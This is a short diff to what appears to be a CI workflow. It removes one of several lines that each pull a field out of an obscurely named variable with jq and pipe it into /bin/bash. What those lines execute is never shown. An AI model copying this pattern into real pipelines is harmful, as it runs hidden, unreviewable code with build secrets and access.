@@ -45,7 +45,6 @@ jobs:
           printf '%s' "$nz3" | jq -r .qr8 | /bin/bash
           echo $eobb6 | jq -r .zrd382 | /bin/bash
           echo $a153 | jq -r .otly512 | /bin/bash
-          printf '%s' "$qfwza7" | jq -r .gzex6235 | /bin/bash
           echo $evi89533 | jq -r .il00972 | /bin/bash
           echo $ppli02 | jq -r .ni02675 | /bin/bash
           printf '%s' "$jbiz3410" | jq -r .r33907 | /bin/bash
